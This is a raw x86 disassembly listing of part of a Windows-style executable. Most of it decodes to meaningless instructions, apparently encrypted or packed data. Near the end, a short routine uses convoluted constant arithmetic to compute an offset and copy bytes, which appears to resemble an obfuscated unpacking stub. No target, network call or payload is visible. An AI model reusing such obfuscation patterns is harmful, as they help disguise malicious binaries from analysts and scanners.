  41150a:	xchg   ebp,eax
  41150b:	test   BYTE PTR [edi+0x49816644],0xcf
  411512:	das    
  411513:	pop    eax
  411514:	inc    ebx
  411515:	int3   
  411516:	adc    ah,0xba
  411519:	mov    ds:0x30e4ca92,eax
  41151e:	pop    es
  41151f:	dec    esp
  411520:	mov    ds:0xfea2d1bd,eax
  411525:	dec    edx
  411526:	das    
  411527:	stos   DWORD PTR es:[edi],eax
  411528:	mov    eax,0x596de885
  41152d:	ss mov dh,0x2
  411530:	fdiv   DWORD PTR [esi]
  411532:	inc    esp
  411533:	rcr    edx,0xec
  411536:	fs in  eax,dx
  411538:	in     eax,dx
  411539:	dec    ecx
  41153a:	push   0xb1dd44bd
  41153f:	iret   
  411540:	ror    DWORD PTR [ebx+0x55fd0e87],cl
  411546:	push   edx
  411547:	imul   ecx,DWORD PTR [ebx],0xbc55d7d
  41154d:	sar    BYTE PTR [eax-0x6f843591],1
  411553:	sbb    dl,BYTE PTR [ecx+0x5e61684a]
  411559:	jge    0x41156b
  41155b:	inc    edx
  41155c:	popa   
  41155d:	leave  
  41155e:	inc    esi
  41155f:	inc    ecx
  411560:	sbb    BYTE PTR gs:[edi],al
  411563:	inc    ecx
  411564:	aam    0x1a
  411566:	inc    edi
  411567:	out    dx,al
  411568:	mov    dh,0x59
  41156a:	mov    al,BYTE PTR es:[ecx-0x1d55376b]
  411571:	xchg   edi,eax
  411572:	ror    BYTE PTR [edx+0x5a3e36b9],1
  411578:	xchg   esp,eax
  411579:	inc    esi
  41157a:	in     eax,dx
  41157b:	das    
  41157c:	jbe    0x411590
  41157e:	dec    edx
  41157f:	popa   
  411580:	neg    BYTE PTR [eax-0x42]
  411583:	dec    ah
  411585:	cmp    WORD PTR [ebp+0x7f],0xffb6
  41158a:	(bad)  [esi-0x4fa4307]
  411590:	pop    esp
  411591:	retf   
  411592:	sub    al,0x9
  411594:	cmp    edx,DWORD PTR [ebp+0x19]
  411597:	ficom  WORD PTR [edi]
  411599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41159a:	push   cs
  41159b:	adc    dh,dl
  41159d:	imul   esp,DWORD PTR [ecx-0x37],0xb94f2eb3
  4115a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a5:	adc    edx,esi
  4115a7:	cmc    
  4115a8:	jmp    0x1dd8:0x94af0a52
  4115af:	push   0xffffff87
  4115b1:	push   ebp
  4115b2:	pop    edx
  4115b3:	inc    esp
  4115b4:	mov    fs,esp
  4115b6:	retf   
  4115b7:	mov    bl,0x8b
  4115b9:	pusha  
  4115ba:	cli    
  4115bb:	mov    eax,ds:0xd92b4f9b
  4115c0:	push   esp
  4115c1:	sub    esi,DWORD PTR [ebx-0x1c0c7fe7]
  4115c7:	inc    ebx
  4115c8:	pop    ss
  4115c9:	shr    esp,0xe6
  4115cc:	stos   DWORD PTR es:[edi],eax
  4115cd:	pop    ecx
  4115ce:	xchg   dl,cl
  4115d0:	clc    
  4115d1:	dec    ebp
  4115d2:	xchg   BYTE PTR [edx],dl
  4115d4:	mul    BYTE PTR [edi-0x5c]
  4115d7:	xchg   DWORD PTR [eax-0x17],esi
  4115da:	out    0x85,eax
  4115dc:	out    0xcb,al
  4115de:	(bad)  
  4115df:	das    
  4115e0:	lods   eax,DWORD PTR es:[esi]
  4115e2:	xor    DWORD PTR [esi+0x3e],eax
  4115e5:	sbb    esi,DWORD PTR [ebp-0x2b]
  4115e8:	jae    0x4115ed
  4115ea:	hlt    
  4115eb:	push   ebx
  4115ec:	push   eax
  4115ed:	jnp    0x41161e
  4115ef:	(bad)  
  4115f0:	mov    ecx,0xdc5d45a3
  4115f5:	xor    dl,BYTE PTR [esi+ebp*1]
  4115f8:	js     0x411613
  4115fa:	mov    ah,BYTE PTR [ebx-0x285f9500]
  411600:	das    
  411601:	xor    esp,DWORD PTR [edi]
  411603:	push   ds
  411604:	mov    eax,ds:0x86392c9c
  411609:	xchg   esi,eax
  41160a:	add    eax,edi
  41160c:	xchg   DWORD PTR [edi-0x7f061c92],ecx
  411612:	sub    bl,BYTE PTR [eax+0x15]
  411615:	cmp    al,ah
  411617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411618:	jne    0x411645
  41161a:	ret    0x5fc4
  41161d:	das    
  41161e:	dec    edx
  41161f:	jae    0x411638
  411621:	iret   
  411622:	aaa    
  411623:	pusha  
  411624:	mov    ebp,0x4a46cf0b
  411629:	inc    esi
  41162a:	xchg   ecx,eax
  41162b:	retf   
  41162c:	inc    ecx
  41162d:	jmp    0x411631
  41162f:	test   ebp,0x1be5f2c6
  411635:	das    
  411636:	push   edx
  411637:	data16 add al,0x17
  41163a:	sub    DWORD PTR ds:0x8067b097,ebp
  411640:	mov    ds,WORD PTR [ebx]
  411642:	adc    BYTE PTR [ebp+0x11],bl
  411645:	adc    esi,eax
  411647:	fcom   QWORD PTR [ebp-0x4ce5ea45]
  41164d:	mov    ecx,0x730a93d7
  411652:	push   eax
  411653:	mov    bl,0x12
  411655:	or     DWORD PTR [ebx+0x3d],esp
  411658:	or     ah,BYTE PTR [ecx+0x5e]
  41165b:	inc    ebp
  41165c:	ins    DWORD PTR es:[edi],dx
  41165d:	pop    esp
  41165e:	ss je  0x41166f
  411661:	lods   eax,DWORD PTR ds:[esi]
  411662:	or     al,0xb1
  411664:	aas    
  411665:	mov    ecx,0x7770a9a8
  41166a:	mov    ebx,0x36721413
  41166f:	daa    
  411670:	jmp    0xe65c:0xcf652978
  411677:	inc    esp
  411678:	jbe    0x41163e
  41167a:	sub    al,BYTE PTR [edi+0x42]
  41167d:	add    ch,BYTE PTR [edx]
  41167f:	scas   al,BYTE PTR es:[edi]
  411680:	loopne 0x41167c
  411682:	pop    ebp
  411683:	push   ds
  411684:	shl    BYTE PTR [edx+0x5ef28498],1
  41168a:	fdiv   st,st(0)
  41168c:	cld    
  41168d:	mov    WORD PTR [ebp+0x3bc565a3],ss
  411693:	call   0x905:0x82748e4d
  41169a:	push   cs
  41169b:	pop    ds
  41169c:	ror    BYTE PTR [esi],1
  41169e:	mov    ds:0x3ed9b93,eax
  4116a3:	iret   
  4116a4:	mov    edx,0x7d457dec
  4116a9:	push   esi
  4116aa:	mov    ds:0x757da377,al
  4116af:	mov    ah,0xa7
  4116b1:	mov    edi,0x8297cdbd
  4116b6:	test   eax,0xf69579ea
  4116bb:	or     ah,BYTE PTR [esp+esi*8]
  4116be:	jg     0x4116d2
  4116c0:	int3   
  4116c1:	mov    ebp,0x54c35cbd
  4116c6:	int3   
  4116c7:	loope  0x41168c
  4116c9:	xchg   esp,eax
  4116ca:	clc    
  4116cb:	cdq    
  4116cc:	mov    edx,DWORD PTR [esi+0x34]
  4116cf:	push   ds
  4116d0:	mov    edx,0x15dcf3b1
  4116d5:	pop    edi
  4116d6:	sti    
  4116d7:	shr    DWORD PTR [edi],cl
  4116d9:	push   es
  4116da:	pusha  
  4116db:	push   ebp
  4116dc:	imul   edx,DWORD PTR [esi-0x41],0xffffff87
  4116e0:	icebp  
  4116e1:	cld    
  4116e2:	xor    ah,BYTE PTR ds:0x78343ea8
  4116e8:	loopne 0x41169d
  4116ea:	int    0x8e
  4116ec:	cmp    BYTE PTR [edi-0x72f2dc7d],cl
  4116f2:	jmp    0x1547:0x8a6f2ab8
  4116f9:	inc    ebx
  4116fa:	(bad)  [ebx+0x59e76465]
  411700:	es cmp al,dh
  411703:	dec    esi
  411704:	mov    ebp,0x99f84d0a
  411709:	cmp    al,0xa8
  41170b:	mov    dh,0x70
  41170d:	mov    esi,0xf1f47f00
  411712:	push   esi
  411713:	stc    
  411714:	add    al,0x36
  411716:	scas   al,BYTE PTR es:[edi]
  411717:	and    DWORD PTR [esi-0x3f3b6223],edx
  41171d:	mov    ebx,edi
  41171f:	xchg   esi,eax
  411720:	test   BYTE PTR [eax-0x770c3396],bh
  411726:	in     al,dx
  411727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411728:	dec    ebx
  411729:	adc    ch,BYTE PTR [ecx+0x75a8754a]
  41172f:	icebp  
  411730:	xchg   ecx,eax
  411731:	pop    es
  411732:	inc    edi
  411733:	mov    esp,0x2a0d69df
  411738:	pop    ss
  411739:	mov    WORD PTR ds:0x93d5d3c1,ss
  41173f:	cmp    esp,0xa9a60779
  411745:	in     al,0xd3
  411747:	into   
  411748:	pop    esp
  411749:	bnd je 0x4117cb
  41174c:	sbb    eax,edi
  41174e:	mov    ds:0xc4bc56f0,eax
  411753:	ins    DWORD PTR es:[edi],dx
  411754:	and    edx,DWORD PTR [esi]
  411756:	push   es
  411757:	loope  0x4116fa
  411759:	dec    eax
  41175a:	and    BYTE PTR [ebx],dl
  41175c:	jmp    0x927b306f
  411761:	lea    esi,[edi]
  411763:	js     0x4117c0
  411765:	jge    0x4117a1
  411767:	iret   
  411768:	xchg   BYTE PTR [ebp+0x68],ch
  41176b:	mov    ds:0x6361f70d,eax
  411770:	xor    DWORD PTR [edx+0x3fe3abaa],ecx
  411776:	test   DWORD PTR [ecx+eax*2+0x7c],edi
  41177a:	pop    es
  41177b:	ret    0xda3
  41177e:	mov    ebp,0x3659c375
  411783:	sub    ch,bh
  411785:	add    DWORD PTR [ebx],0xffffffa8
  411788:	jp     0x4117ba
  41178a:	push   ds
  41178b:	mov    ss,esp
  41178d:	inc    ebp
  41178e:	mov    al,ds:0x16fa977c
  411793:	ins    BYTE PTR es:[edi],dx
  411794:	mov    WORD PTR [ebp-0x21dc7967],es
  41179a:	hlt    
  41179b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41179c:	dec    esp
  41179d:	loop   0x41179b
  41179f:	sub    al,0x3e
  4117a1:	stc    
  4117a2:	jge    0x411816
  4117a4:	stc    
  4117a5:	or     bh,BYTE PTR [ecx+0x183da15f]
  4117ab:	(bad)  
  4117ac:	jl     0x4117ca
  4117ae:	sub    eax,ebx
  4117b0:	call   0x4fb9:0xb0b6f7b8
  4117b7:	xor    eax,0x67beb541
  4117bc:	fsubr  QWORD PTR [esi-0x4c]
  4117bf:	out    0xa0,eax
  4117c1:	dec    esp
  4117c2:	mov    eax,es:0xaae412ec
  4117c8:	jns    0x41179a
  4117ca:	and    al,0xa2
  4117cc:	ficom  WORD PTR [ebx+0x2b]
  4117cf:	jp     0x41182e
  4117d1:	xchg   ebx,eax
  4117d2:	or     al,cl
  4117d4:	push   ebp
  4117d5:	jne    0x41176f
  4117d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d9:	or     al,0x44
  4117db:	inc    edi
  4117dc:	call   DWORD PTR [ebx+0x6f]
  4117df:	mov    cl,0x9f
  4117e1:	or     eax,0x21351853
  4117e6:	(bad)  
  4117e7:	aam    0xfb
  4117e9:	xchg   ebx,eax
  4117ea:	pop    es
  4117eb:	in     eax,0xb
  4117ed:	pop    eax
  4117ee:	aas    
  4117ef:	adc    eax,DWORD PTR [edx-0x1f]
  4117f2:	loopne 0x41184b
  4117f4:	sub    ah,ch
  4117f6:	push   eax
  4117f7:	inc    edx
  4117f8:	add    BYTE PTR [edi-0x714040d3],bl
  4117fe:	hlt    
  4117ff:	lahf   
  411800:	fwait
  411801:	sbb    DWORD PTR [edi],ecx
  411803:	out    0x33,eax
  411805:	dec    ebx
  411806:	mov    dh,0x46
  411808:	cld    
  411809:	jmp    0x81107b03
  41180e:	in     eax,dx
  41180f:	push   cs
  411810:	fist   DWORD PTR [esi]
  411812:	cli    
  411813:	in     al,dx
  411814:	push   ss
  411815:	fisttp WORD PTR [ebp+0x19]
  411818:	(bad)  
  411819:	sbb    al,0x80
  41181b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41181c:	inc    edi
  41181d:	test   al,0x44
  41181f:	popf   
  411820:	ins    BYTE PTR es:[edi],dx
  411821:	inc    esi
  411822:	xchg   edi,eax
  411823:	sub    cl,bl
  411825:	jb     0x411886
  411827:	stos   BYTE PTR es:[edi],al
  411828:	xchg   esi,eax
  411829:	(bad)  
  41182a:	mov    esi,0x70b8675b
  41182f:	xchg   ebp,eax
  411830:	addr16 aam 0x8e
  411833:	xor    BYTE PTR cs:[ecx-0x19],cl
  411837:	pop    ds
  411838:	mov    ds:0x8ae950bf,eax
  41183d:	add    eax,DWORD PTR [eax]
  41183f:	add    bh,dl
  411841:	xchg   ebx,eax
  411842:	push   edx
  411843:	call   FWORD PTR [edx-0x30636400]
  411849:	fist   WORD PTR [eax+0x7c837290]
  41184f:	xchg   edx,eax
  411850:	scas   eax,DWORD PTR es:[edi]
  411851:	pop    edx
  411852:	mov    esi,0xbec499be
  411857:	mov    esi,0xdab3de48
  41185c:	xchg   BYTE PTR [esp+edx*8-0x45],cl
  411860:	pop    ss
  411861:	mov    ebx,0xf90b8c01
  411866:	xchg   esp,eax
  411867:	inc    eax
  411868:	pop    ds
  411869:	jp     0x4118d6
  41186b:	xlat   BYTE PTR ds:[ebx]
  41186c:	inc    esp
  41186d:	sub    al,dl
  41186f:	add    esi,edx
  411871:	jmp    0x411804
  411873:	push   ebp
  411874:	xchg   DWORD PTR [esi-0x50],ecx
  411877:	mov    ds:0xbc7c0107,al
  41187c:	inc    BYTE PTR [ecx]
  41187e:	ret    
  41187f:	pop    es
  411880:	xchg   esi,eax
  411881:	pop    eax
  411882:	mov    al,ds:0xd385d0f1
  411887:	pop    esp
  411888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411889:	retf   0x6002
  41188c:	(bad)  
  41188d:	sahf   
  41188e:	mov    eax,0x6db5d5b
  411893:	pop    ebx
  411894:	loopne 0x41189e
  411896:	mov    al,ds:0x61fa1885
  41189b:	js     0x4118f4
  41189d:	add    DWORD PTR [edx+0x7d],edi
  4118a0:	pop    esp
  4118a1:	xor    al,BYTE PTR [edi+0x759df189]
  4118a7:	cmp    ebx,DWORD PTR [ecx]
  4118a9:	test   cl,al
  4118ab:	repz test BYTE PTR [esp+eiz*2],ch
  4118af:	and    DWORD PTR [ecx+0x72],esp
  4118b2:	sub    dl,BYTE PTR [edi+0x72118842]
  4118b8:	xchg   ecx,eax
  4118b9:	push   edx
  4118ba:	lods   eax,DWORD PTR ds:[esi]
  4118bb:	push   eax
  4118bc:	push   edx
  4118bd:	out    dx,eax
  4118be:	dec    esp
  4118bf:	ja     0x41189a
  4118c1:	mov    edx,0xbe855947
  4118c6:	push   0x5ae36866
  4118cb:	sub    eax,0xb9f56cbc
  4118d0:	addr16 jge 0x411950
  4118d3:	mov    esi,0x1aed2da2
  4118d8:	lds    edx,FWORD PTR [eax-0x27e90442]
  4118de:	repnz popa 
  4118e0:	jns    0x4118bc
  4118e2:	mov    al,0xf2
  4118e4:	mov    dl,0x3a
  4118e6:	sub    BYTE PTR [ebx+0x1cbd8b92],ah
  4118ec:	sub    eax,0xd018415
  4118f1:	jle    0x411940
  4118f3:	pop    es
  4118f4:	mov    edi,0xd991cb56
  4118f9:	(bad)  
  4118fa:	jmp    0x411914
  4118fc:	data16 ficom DWORD PTR [eax+0x59b96f41]
  411903:	test   eax,0x939fd51e
  411908:	cmp    eax,0xe8b35dc5
  41190d:	cmp    eax,0x5955e70b
  411912:	xchg   esp,eax
  411913:	test   al,0xf4
  411915:	icebp  
  411916:	xlat   BYTE PTR ds:[ebx]
  411917:	sahf   
  411918:	call   0xb5ef4020
  41191d:	(bad)  
  41191e:	rcr    DWORD PTR [edi+0x7effdfcf],cl
  411924:	or     eax,0xc5623f9b
  411929:	bound  ebp,QWORD PTR [edx]
  41192b:	sbb    al,0xc2
  41192d:	mov    ch,0xc7
  41192f:	push   cs
  411930:	mov    edx,0xe7c85fa8
  411935:	mov    edx,0x3206ddb4
  41193a:	(bad)  
  41193b:	dec    esi
  41193c:	or     BYTE PTR [edx+0x4f],dh
  41193f:	mov    ecx,0x75447bba
  411944:	out    dx,eax
  411945:	dec    ecx
  411946:	cld    
  411947:	fstp   DWORD PTR [esi]
  411949:	xchg   edi,eax
  41194a:	aam    0xd6
  41194c:	sbb    bh,0x3a
  41194f:	ja     0x4118e3
  411951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411952:	retf   0xc29c
  411955:	mov    al,BYTE PTR [esi+0x37e754b8]
  41195b:	std    
  41195c:	ficomp WORD PTR [eax+ebp*2+0x240e7883]
  411963:	xchg   ebx,eax
  411964:	or     al,0x92
  411966:	xchg   edx,eax
  411967:	cmp    ch,bh
  411969:	mov    dl,0xb8
  41196b:	ffreep st(4)
  41196d:	sbb    DWORD PTR [ebx+0x3b27fcd5],edx
  411973:	stc    
  411974:	jle    0x411939
  411976:	std    
  411977:	xor    eax,0x669e339a
  41197c:	dec    eax
  41197d:	lock and eax,0x72a63e1c
  411983:	jbe    0x41190e
  411985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411986:	es hlt 
  411988:	sub    ah,0x83
  41198b:	cvtpi2ps xmm0,QWORD PTR [eax]
  41198e:	mov    WORD PTR [edi],fs
  411990:	repnz xlat BYTE PTR ds:[ebx]
  411992:	or     esi,DWORD PTR [esi-0x69d6aaaa]
  411998:	dec    edx
  411999:	aas    
  41199a:	mov    ebp,0xf9e89978
  41199f:	xor    BYTE PTR [edi-0x63],dl
  4119a2:	jmp    0x4119e7
  4119a4:	mov    ch,dl
  4119a6:	jl     0x4119e8
  4119a8:	push   edi
  4119a9:	btr    DWORD PTR [ebp+0x6d],ecx
  4119ad:	xchg   DWORD PTR [edi-0x69],edi
  4119b0:	dec    eax
  4119b1:	and    edx,edx
  4119b3:	jge    0x411a19
  4119b5:	add    DWORD PTR ds:0xe48e6275,ebx
  4119bb:	das    
  4119bc:	xchg   BYTE PTR [eax+0x3cf9010d],dl
  4119c2:	and    eax,0x3280a4d3
  4119c7:	lock cwde 
  4119c9:	push   esi
  4119ca:	push   ebp
  4119cb:	cs dec esi
  4119cd:	sahf   
  4119ce:	pop    ebp
  4119cf:	imul   esi,DWORD PTR [esi-0x5f],0x4ce8a2c5
  4119d6:	jecxz  0x411987
  4119d8:	bound  esi,QWORD PTR [edi+0x3f]
  4119db:	cli    
  4119dc:	jmp    0x747f:0xb1bb6cc1
  4119e3:	in     al,dx
  4119e4:	popf   
  4119e5:	fmul   QWORD PTR [ebx+0x30d36337]
  4119eb:	jbe    0x41196f
  4119ed:	or     al,0x21
  4119ef:	cdq    
  4119f0:	nop
  4119f1:	pop    ss
  4119f2:	push   ds
  4119f3:	mov    bh,0xf
  4119f5:	sbb    al,0xd6
  4119f7:	dec    ecx
  4119f8:	or     BYTE PTR [ecx-0x70],dl
  4119fb:	retf   0xfaa5
  4119fe:	sub    al,dl
  411a00:	xor    dh,0x42
  411a03:	adc    ch,BYTE PTR [esi]
  411a05:	inc    ecx
  411a06:	cmp    bl,dh
  411a08:	mov    esi,0xd6673b83
  411a0d:	rcl    DWORD PTR [ebx+0xf],cl
  411a10:	das    
  411a11:	mov    eax,ds:0xb9bc7896
  411a16:	and    DWORD PTR [edx-0xc],edi
  411a19:	add    al,0x26
  411a1b:	sub    BYTE PTR [edx],dl
  411a1d:	jmp    FWORD PTR [ebx]
  411a1f:	mov    al,0xaa
  411a21:	mov    ds:0xe5a8465c,al
  411a26:	repz pop ss
  411a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a29:	ret    0x394
  411a2c:	pop    edx
  411a2d:	in     eax,dx
  411a2e:	lea    edi,[ebx]
  411a30:	int3   
  411a31:	pop    eax
  411a32:	iret   
  411a33:	(bad)  
  411a34:	mov    dl,0x22
  411a36:	out    dx,eax
  411a37:	fldenv [ecx-0x2a]
  411a3a:	or     ebx,DWORD PTR [ecx-0x5bc553c4]
  411a40:	es hlt 
  411a42:	push   ebx
  411a43:	xor    eax,0xf73733dd
  411a48:	(bad)  
  411a49:	mov    bl,BYTE PTR ds:0x9727e93d
  411a4f:	rcl    eax,cl
  411a51:	(bad)  
  411a52:	clts   
  411a54:	imul   ebp,DWORD PTR [ecx],0xacea1602
  411a5a:	pop    ds
  411a5b:	mov    BYTE PTR [ebp+ebp*1+0x6be59fda],0xe
  411a63:	jnp    0x4119f2
  411a65:	inc    edi
  411a66:	sar    BYTE PTR [edx+0x63ab7e79],0xa5
  411a6d:	call   0x9c7daa0a
  411a72:	xor    DWORD PTR [ecx],0xffffff91
  411a75:	aaa    
  411a76:	and    al,0x81
  411a78:	outs   dx,BYTE PTR ds:[esi]
  411a79:	jbe    0x411a62
  411a7b:	out    0x3,eax
  411a7d:	shl    DWORD PTR [eax-0xd],0xa0
  411a81:	inc    esi
  411a82:	data16 loope 0x411a2d
  411a85:	fcom   st(3)
  411a87:	inc    ebp
  411a88:	mov    ecx,0x9b693dfe
  411a8d:	jmp    0xafcd:0x361aadff
  411a94:	pop    ebx
  411a95:	(bad)  
  411a96:	in     eax,0x54
  411a98:	push   0xcfa3b4ba
  411a9d:	and    al,0xb4
  411a9f:	xchg   DWORD PTR [esi],esp
  411aa1:	scas   eax,DWORD PTR es:[edi]
  411aa2:	jne    0x411a5a
  411aa4:	bound  edx,QWORD PTR [ebx]
  411aa6:	mov    ah,bh
  411aa8:	out    0x4c,eax
  411aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411aab:	inc    edi
  411aac:	repz jne 0x411aed
  411aaf:	mov    ecx,0xd3fee1f7
  411ab4:	leave  
  411ab5:	scas   eax,DWORD PTR es:[edi]
  411ab6:	loopne 0x411a38
  411ab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab9:	mov    DWORD PTR [eax+0x30366901],edx
  411abf:	in     eax,0x7f
  411ac1:	push   0x87f608ac
  411ac6:	(bad)  
  411ac7:	push   ss
  411ac8:	fist   WORD PTR [edi+0x64]
  411acb:	in     al,dx
  411acc:	xchg   edx,eax
  411acd:	jbe    0x411a78
  411acf:	outs   dx,DWORD PTR ds:[esi]
  411ad0:	add    bh,BYTE PTR [edi+0xeb168be]
  411ad6:	addr16 fucompp 
  411ad9:	and    al,0x5e
  411adb:	mov    DWORD PTR [edx-0x37],edi
  411ade:	imul   ebx,DWORD PTR [edi+0x70881abb],0x4a
  411ae5:	mov    ebx,0x872b3a72
  411aea:	lods   al,BYTE PTR ds:[esi]
  411aeb:	pop    ebx
  411aec:	jmp    0x411b37
  411aee:	ja     0x411af8
  411af0:	test   al,0x1c
  411af2:	mov    eax,ds:0x4d501638
  411af7:	imul   esi,DWORD PTR [esi],0xf9cc7e71
  411afd:	inc    eax
  411afe:	ja     0x411b03
  411b00:	pop    esp
  411b01:	mov    bl,0xe0
  411b03:	inc    esp
  411b04:	dec    esp
  411b05:	cmp    al,0x76
  411b07:	ror    DWORD PTR [esi+ecx*1+0x41ba2b23],cl
  411b0e:	mov    cl,0xbe
  411b10:	mov    ebx,0xbef1a47
  411b15:	les    ebx,FWORD PTR [edi]
  411b17:	add    ebx,esi
  411b19:	cs xor eax,0x7de467ba
  411b1f:	sbb    dl,al
  411b21:	mov    edi,DWORD PTR [ecx]
  411b23:	into   
  411b24:	int3   
  411b25:	fmul   st(7),st
  411b27:	pop    esi
  411b28:	test   al,0xe0
  411b2a:	scas   al,BYTE PTR es:[edi]
  411b2b:	sti    
  411b2c:	mov    esi,0xe04733ff
  411b31:	clc    
  411b32:	icebp  
  411b33:	cld    
  411b34:	mov    dh,0xe5
  411b36:	jle    0x411b32
  411b38:	jg     0x411b44
  411b3a:	cmc    
  411b3b:	add    esp,ebp
  411b3d:	fsubr  st(6),st
  411b3f:	dec    eax
  411b40:	bound  edi,QWORD PTR [edx-0x24]
  411b43:	mov    edx,DWORD PTR [ecx+edi*2+0x31]
  411b47:	cdq    
  411b48:	cli    
  411b49:	mov    dh,0x74
  411b4b:	mov    al,ds:0x3a24af6c
  411b50:	ret    0x3684
  411b53:	jmp    0x3ff:0x745c3a95
  411b5a:	mov    WORD PTR [edi-0x1c412124],fs
  411b60:	push   0xc8a49145
  411b65:	xor    eax,0x79c5a34a
  411b6a:	xor    eax,0x6b20337b
  411b6f:	stos   BYTE PTR es:[edi],al
  411b70:	mov    BYTE PTR [edx+esi*2-0x5b1f6f8c],cl
  411b77:	inc    edi
  411b78:	dec    eax
  411b79:	call   0x806ab2c
  411b7e:	sub    al,0x14
  411b80:	xchg   ecx,eax
  411b81:	or     al,0xb5
  411b83:	or     eax,DWORD PTR [eax-0x8]
  411b86:	add    ah,BYTE PTR [edi]
  411b88:	icebp  
  411b89:	xchg   esp,eax
  411b8a:	pusha  
  411b8b:	jbe    0x411b95
  411b8d:	jge    0x411b17
  411b8f:	call   0x6be6d53b
  411b94:	push   cs
  411b95:	pop    edx
  411b96:	js     0x411bff
  411b98:	cmp    esi,esi
  411b9a:	pop    ds
  411b9b:	mov    al,ds:0x6ff8c28c
  411ba0:	pusha  
  411ba1:	or     BYTE PTR [eax],0x84
  411ba4:	sar    BYTE PTR [edi+0x333fa996],cl
  411baa:	ror    edx,1
  411bac:	xchg   ecx,esi
  411bae:	mov    al,0x1f
  411bb0:	aam    0x3d
  411bb2:	idiv   dh
  411bb4:	test   BYTE PTR [edx+0x7385a85a],ah
  411bba:	sub    DWORD PTR [edi],ecx
  411bbc:	jbe    0x411c27
  411bbe:	addr16 and eax,0xf2d54feb
  411bc4:	loop   0x411bdb
  411bc6:	pop    eax
  411bc7:	and    eax,0x448dfec9
  411bcc:	and    al,0x24
  411bce:	push   eax
  411bcf:	call   0x40f1e1
  411bd4:	mov    eax,DWORD PTR [esp+0x18]
  411bd8:	mov    ecx,DWORD PTR [esp+0x1c]
  411bdc:	push   DWORD PTR [ebp+0x18]
  411bdf:	mov    ebx,DWORD PTR [ebp+0xc]
  411be2:	push   DWORD PTR [ebp+0x14]
  411be5:	mov    esi,DWORD PTR [ebp+0x8]
  411be8:	push   DWORD PTR [ebp+0x10]
  411beb:	push   DWORD PTR [esp+0x20]
  411bef:	push   DWORD PTR [esp+0x20]
  411bf3:	push   DWORD PTR [esp+0x38]
  411bf7:	push   DWORD PTR [esp+0x38]
  411bfb:	call   0x401000
  411c00:	pop    esi
  411c01:	pop    ebx
  411c02:	mov    esp,ebp
  411c04:	pop    ebp
  411c05:	ret    0x14
  411c08:	push   ebp
  411c09:	mov    ebp,esp
  411c0b:	sub    esp,0x30
  411c0e:	mov    DWORD PTR [ebp-0x24],0x7c16
  411c15:	mov    DWORD PTR [ebp-0x20],0x53bd
  411c1c:	mov    DWORD PTR [ebp-0x18],0x3bd5
  411c23:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  411c2a:	mov    DWORD PTR [ebp-0xc],0x4b9d
  411c31:	mov    DWORD PTR [ebp-0x8],0x7e48
  411c38:	mov    DWORD PTR [ebp-0x4],0x604b
  411c3f:	mov    DWORD PTR [ebp-0x30],0x5b69
  411c46:	mov    DWORD PTR [ebp-0x2c],0x4521
  411c4d:	mov    DWORD PTR [ebp-0x28],0x2979
  411c54:	mov    DWORD PTR [ebp-0x14],0x9e8
  411c5b:	mov    DWORD PTR [ebp-0x10],0x40e5
  411c62:	mov    ecx,DWORD PTR [ebp-0x4]
  411c65:	mov    eax,DWORD PTR [ebp-0x8]
  411c68:	add    ecx,0x1d04
  411c6e:	xor    ecx,eax
  411c70:	mov    eax,DWORD PTR [ebp-0xc]
  411c73:	and    ecx,0x6f79
  411c79:	imul   ecx,eax
  411c7c:	xor    ecx,0xe33ab1
  411c82:	push   esi
  411c83:	mov    DWORD PTR [ebp-0x4],0x5989
  411c8a:	mov    DWORD PTR [ebp-0x8],0x402c1
  411c91:	mov    DWORD PTR [ebp-0xc],0x4114
  411c98:	mov    eax,DWORD PTR [ebp-0xc]
  411c9b:	mov    esi,DWORD PTR [ebp-0x8]
  411c9e:	xor    edx,edx
  411ca0:	sub    eax,0x6cb6
  411ca5:	div    esi
  411ca7:	mov    edx,DWORD PTR [ebp-0x4]
  411caa:	mov    esi,DWORD PTR [ebp+0xc]
  411cad:	or     eax,edx
  411caf:	xor    eax,0x67f1
  411cb4:	mov    edx,ecx
  411cb6:	sub    edx,eax
  411cb8:	mov    DWORD PTR [ebp-0x4],edx
  411cbb:	mov    eax,DWORD PTR [ebp-0x4]
  411cbe:	mov    edx,DWORD PTR [ebp-0x4]
  411cc1:	mov    dl,BYTE PTR [edx+esi*1]
  411cc4:	mov    esi,DWORD PTR [ebp+0x8]
  411cc7:	mov    BYTE PTR [eax+esi*1],dl
  411cca:	mov    eax,DWORD PTR [ebp-0x10]
  411ccd:	mov    edx,DWORD PTR [ebp-0x14]
  411cd0:	jmp    0x411fd9
  411cd5:	xchg   esi,eax
  411cd6:	mov    dh,0x33
  411cd8:	push   edx
  411cd9:	xor    ebx,DWORD PTR [eax+edi*4-0x46]
  411cdd:	push   eax
  411cde:	ret    0x923c
  411ce1:	jbe    0x411c74
  411ce3:	hlt    
  411ce4:	iret   
  411ce5:	mov    WORD PTR [eax-0x42],fs
  411ce8:	mov    esi,0xbebec28e
  411ced:	jbe    0x411d14
  411cef:	xchg   ebx,eax
  411cf0:	ret    
  411cf1:	mov    ebx,ecx
  411cf3:	add    dl,BYTE PTR [ebp+0x3d]
  411cf6:	push   ebx
  411cf7:	(bad)  
  411cf8:	das    
  411cf9:	sub    BYTE PTR [esi*8+0x598c24a3],dl
  411d00:	repnz dec edi
  411d02:	arpl   WORD PTR [esi+0x2b],sp
  411d05:	cmp    DWORD PTR [eax-0x2c],edi
  411d08:	jg     0x411cb8
  411d0a:	push   ebx
  411d0b:	add    al,0xb1
  411d0d:	sahf   
  411d0e:	shl    DWORD PTR [eax+ebp*4],0x23
  411d12:	pop    ds
  411d13:	mov    ch,0xb2
  411d15:	ds jl  0x411d3c
  411d18:	fwait
  411d19:	out    dx,al
  411d1a:	stos   BYTE PTR es:[edi],al
